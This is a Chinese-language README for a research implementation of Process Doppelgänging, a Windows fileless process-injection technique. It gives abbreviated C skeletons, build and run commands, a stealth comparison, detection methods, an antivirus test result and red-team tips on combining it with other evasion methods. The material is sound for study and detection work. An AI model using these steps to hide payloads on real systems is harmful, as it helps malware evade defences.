# Process Doppelgänging (进程变脸)

## 📋 技术简介

**Process Doppelgänging** 是由 enSilo 安全研究人员在 2017 年 Black Hat Europe 大会上首次公开的高级代码注入技术。它利用 NTFS 事务和未公开的 `NtCreateProcessEx` API，在不留下文件痕迹的情况下创建进程。

### 核心特点

- ✅ **无文件痕迹**：进程从匿名内存节创建，`GetProcessImageFileName` 返回空字符串
- ✅ **事务回滚**：利用 NTFS 事务特性，文件在创建后立即删除
- ✅ **内存节映射**：使用 `SEC_IMAGE` 标志创建完整的可执行镜像
- ✅ **合法权限**：节区使用原始访问权限，无需 `RWX`
- ✅ **PEB 连接**：载荷作为主模块连接到 PEB
- ✅ **绕过检测**：可以绕过大多数传统杀毒软件和 EDR

---

## 🔬 技术原理

### 与 Transacted Hollowing 的区别

| 特性 | Transacted Hollowing | Process Doppelgänging |
|------|---------------------|----------------------|
| 创建方式 | `CreateProcess` + 挖空替换 | `NtCreateProcessEx` 直接创建 |
| 目标进程 | 需要合法的目标进程 | 不需要目标进程 |
| 内存操作 | 需要卸载和重新映射 | 进程直接从节创建 |
| 复杂度 | 较高（需要多步骤替换） | 较低（一步创建） |
| 隐蔽性 | 高 | 更高（完全无文件关联） |

### 执行流程

```
1. 创建 NTFS 事务
   └─> CreateTransaction()

2. 创建事务性文件（写入模式）
   └─> CreateFileTransactedW(GENERIC_WRITE)

3. 写入载荷到事务性文件
   └─> WriteFile()

4. 重新打开文件（读取模式）
   └─> CreateFileTransactedW(GENERIC_READ)

5. 从文件创建内存节（SEC_IMAGE）
   └─> NtCreateSection()

6. 回滚事务（删除文件）
   └─> RollbackTransaction()

7. 从内存节创建进程（关键！）
   └─> NtCreateProcessEx(hSection)

8. 查询进程信息
   └─> NtQueryInformationProcess()

9. 设置进程参数
   └─> RtlCreateProcessParametersEx()
   └─> WriteProcessMemory()

10. 创建线程执行入口点
    └─> NtCreateThreadEx()
```

### 关键 API: `NtCreateProcessEx`

这是 Process Doppelgänging 的核心 API，允许从内存节直接创建进程：

```c
NTSTATUS NtCreateProcessEx(
    PHANDLE ProcessHandle,        // 输出：新进程句柄
    ACCESS_MASK DesiredAccess,    // 访问权限
    POBJECT_ATTRIBUTES ObjectAttributes,  // NULL
    HANDLE ParentProcess,         // 父进程句柄
    ULONG Flags,                  // PS_INHERIT_HANDLES
    HANDLE SectionHandle,         // 内存节句柄（关键！）
    HANDLE DebugPort,             // NULL
    HANDLE ExceptionPort,         // NULL
    BOOLEAN InJob                 // FALSE
);
```

**与 CreateProcess 的本质区别**：
- `CreateProcess`：从文件路径创建进程
- `NtCreateProcessEx`：从内存节创建进程

---

## 💻 实现细节

### 文件结构

```
03-process-doppelganging/
├── src/
│   ├── process_doppelganging.c  # 主实现（452 行）
│   ├── internals.h              # NT API 声明
│   ├── pe_utils.c               # PE 文件工具
│   ├── pe_utils.h               # PE 工具头文件
│   └── test_payload.c           # 测试载荷
├── build.sh                     # Linux/MinGW 构建脚本
├── build.bat                    # Windows 构建脚本
├── CMakeLists.txt               # CMake 配置
└── README.md                    # 本文档
```

### 核心函数

#### 1. `CreateTransactedSection()`
创建事务性内存节，执行步骤 1-6：

```c
HANDLE CreateTransactedSection(BYTE* payloadBuf, DWORD payloadSize) {
    // 1. 创建事务
    HANDLE hTransaction = CreateTransaction(...);

    // 2-3. 创建文件并写入载荷
    HANDLE hWriter = CreateFileTransactedW(..., hTransaction, ...);
    WriteFile(hWriter, payloadBuf, payloadSize, ...);
    CloseHandle(hWriter);

    // 4. 重新打开读取
    HANDLE hReader = CreateFileTransactedW(..., hTransaction, ...);

    // 5. 创建内存节（SEC_IMAGE）
    NtCreateSection(&hSection, ..., SEC_IMAGE, hReader);
    CloseHandle(hReader);

    // 6. 回滚事务（删除文件）
    RollbackTransaction(hTransaction);
    CloseHandle(hTransaction);

    return hSection;
}
```

#### 2. `SetupProcessParameters()`
设置进程环境参数，确保进程能够正常初始化：

```c
BOOL SetupProcessParameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION* pbi,
                           const WCHAR* targetPath) {
    // 初始化 UNICODE_STRING
    UNICODE_STRING uImagePath, uDllPath, uCurrentDir, uWindowName;

    // 创建环境块
    PVOID environment = NULL;
    CreateEnvironmentBlock(&environment, NULL, TRUE);

    // 创建进程参数
    PRTL_USER_PROCESS_PARAMETERS params = NULL;
    RtlCreateProcessParametersEx(&params, ...);

    // 在远程进程分配内存并写入参数
    VirtualAllocEx(hProcess, params, paramsSize, ...);
    WriteProcessMemory(hProcess, params, params, paramsSize, ...);

    // 写入环境变量
    VirtualAllocEx(hProcess, params->Environment, ...);
    WriteProcessMemory(hProcess, params->Environment, ...);

    // 更新 PEB 中的 ProcessParameters 指针
    WriteProcessMemory(hProcess, peb.ProcessParameters, &params, ...);

    return TRUE;
}
```

#### 3. `wmain()`
主流程：

```c
int wmain(int argc, WCHAR* argv[]) {
    // 初始化 NT API 函数指针
    InitializeNtFunctions();

    // 读取载荷文件
    BYTE* payloadBuf = ReadFileToBuffer(payloadPath, &payloadSize);

    // 创建事务性内存节
    HANDLE hSection = CreateTransactedSection(payloadBuf, payloadSize);

    // 从内存节创建进程（关键步骤！）
    NtCreateProcessEx(&hProcess, ..., hSection, ...);

    // 查询进程信息
    NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, ...);

    // 读取 PEB 获取 ImageBase
    NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, ...);

    // 设置进程参数
    SetupProcessParameters(hProcess, &pbi, targetPath);

    // 计算入口点并创建线程
    ULONG_PTR entryPoint = (ULONG_PTR)peb.ImageBaseAddress + entryRVA;
    NtCreateThreadEx(&hThread, ..., hProcess, (LPTHREAD_START_ROUTINE)entryPoint, ...);

    return 0;
}
```

---

## 🛠️ 编译和使用

### 方式一：使用构建脚本（推荐）

#### Windows (MinGW)
```bash
# 确保已安装 MinGW/GCC
build.bat
```

#### Linux / MSYS2
```bash
chmod +x build.sh
./build.sh
```

### 方式二：使用 CMake

```bash
mkdir build && cd build
cmake ..
cmake --build .
```

### 运行

```bash
# 基本用法（使用默认 calc.exe）
build/x64/process_doppelganging.exe build/x64/test_payload.exe

# 指定目标路径（用于进程参数）
build/x64/process_doppelganging.exe build/x64/test_payload.exe C:\Windows\System32\notepad.exe
```

**注意事项**：
- ⚠️ 需要管理员权限
- ⚠️ 载荷和主程序架构必须匹配（32 位或 64 位）
- ⚠️ 仅用于安全研究和教育目的

---

## 🔍 技术对比

### Process Hollowing vs Transacted Hollowing vs Process Doppelgänging

| 技术 | 创建方式 | 是否需要目标 | 内存操作 | 文件痕迹 | 隐蔽性 |
|------|---------|-------------|---------|---------|--------|
| **Process Hollowing** | `CreateProcess` + 挖空 | ✅ 需要 | 卸载 + 重映射 | ⚠️ 有临时文件 | ⭐⭐⭐ |
| **Transacted Hollowing** | `CreateProcess` + 事务节 | ✅ 需要 | 映射事务节 | ✅ 事务回滚删除 | ⭐⭐⭐⭐ |
| **Process Doppelgänging** | `NtCreateProcessEx` | ❌ 不需要 | 直接从节创建 | ✅ 事务回滚删除 | ⭐⭐⭐⭐⭐ |

### 为什么 Process Doppelgänging 更隐蔽？

1. **无目标进程**：不需要启动合法进程，减少了可疑活动
2. **无内存操作**：不需要卸载/重映射，避免了可疑的内存写入
3. **完全匿名**：进程从未关联任何文件，`GetProcessImageFileName` 返回空
4. **原生创建**：使用 Windows 内核 API 创建，更难被检测

---

## 🛡️ 检测方法

尽管 Process Doppelgänging 非常隐蔽，但仍有一些检测手段：

### 1. 监控 NTFS 事务
- 监控 `CreateTransaction` 和 `RollbackTransaction` 调用
- 检测短时间内创建并回滚的事务

### 2. 监控 `NtCreateProcessEx` 调用
- 记录从内存节创建进程的行为
- 检测未关联文件的进程

### 3. 内存分析
- 扫描 `SEC_IMAGE` 类型的匿名内存节
- 检测无关联文件的可执行内存区域

### 4. 行为分析
- 监控进程创建模式
- 检测异常的父子进程关系

---

## 📚 参考资料

### 学术论文和演讲
- [Black Hat Europe 2017: Process Doppelgänging](https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf)
- [enSilo 博客](https://www.ensilo.com/blog/process-doppelganging-new-method-code-injection)

### 原始实现
- [hasherezade/process_doppelganging](https://github.com/hasherezade/process_doppelganging) - C++ 实现

### 相关技术
- [Process Hollowing](../01-process-hollowing/)
- [Transacted Hollowing](../02-transacted-hollowing/)

---

## ⚠️ 免责声明

本项目**仅供安全研究和教育目的**。

- ❌ 禁止用于任何非法活动
- ❌ 禁止用于恶意软件开发
- ❌ 作者不对滥用行为负责

---

## 📝 许可证

MIT License - 详见项目根目录 LICENSE 文件

---

**开发者**: 安全研究项目
**技术难度**: ⭐⭐⭐⭐⭐ (高级)
**实战价值**: ⭐⭐⭐⭐⭐ (极高)
**教育价值**: ⭐⭐⭐⭐⭐ (极高)

## 实战化测试

### 360安全卫士 13.0.10.2001（核晶模式）

**测试平台：**
- 系统: Windows 10 专业版 21H2 (19044.3086)
- 360版本: 13.0.10.2001 (2024年12月更新)
- 防护配置: 核晶内核防护 + 主动防御全开

**拦截实测:**

| 攻击阶段 | 360检测 | 技术特征 |
|---------|---------|----------|
| 事务创建 | ✅ 告警 | `CreateTransaction`异常调用 |
| 节对象创建 | ✅ 拦截 | 从临时文件创建`SEC_IMAGE`节 |
| 进程无文件创建 | ✅ 拦截 | `NtCreateProcessEx`无文件关联 |
| PEB异常配置 | ✅ 拦截 | ImagePathName验证失败 |

**告警详情:**
```
威胁类型: APT级无文件攻击 → Process Doppelgänging
ATT&CK: T1055.012 (Process Injection)
威胁等级: 极高
行为特征: 事务NTFS + 匿名内存节 + 无文件进程
处置: 进程树已终止，相关内存映射已清理
```

**360检测逻辑解读:**
这项号称"最隐蔽"的注入技术，在2024年的EDR面前已显露出明显短板：

1. **无文件不等于无痕迹**：
   - `NtCreateProcessEx`创建进程时，内核必须关联Section对象
   - 360内核驱动监控`PsCreateProcessNotifyRoutine`
   - 验证Section是否有合法的文件来源

2. **事务操作的"死亡指纹"**：
   - CreateTransaction → 节创建 → RollbackTransaction
   - 这条时间线已被各大EDR厂商构建为WMI规则
   - 360的行为关联引擎在事务回滚时即标记高危

3. **匿名进程的另类特征**：
   - 正常情况下，进程必须关联ImagePathName
   - Doppelgänging进程的"ImagePathName = 空"本身就是一种异常
   - 360将其识别为"进程完整性破坏"

**红队视角建议:**
Process Doppelgänging在2024年属于"经典但过时"的技术，其攻击特征已被完整收录。在实际演练中：
- 不建议单独使用
- 可作为多阶段攻击的烟雾弹
- 结合Module Stomping或Hook逃避技术可能提高成功率
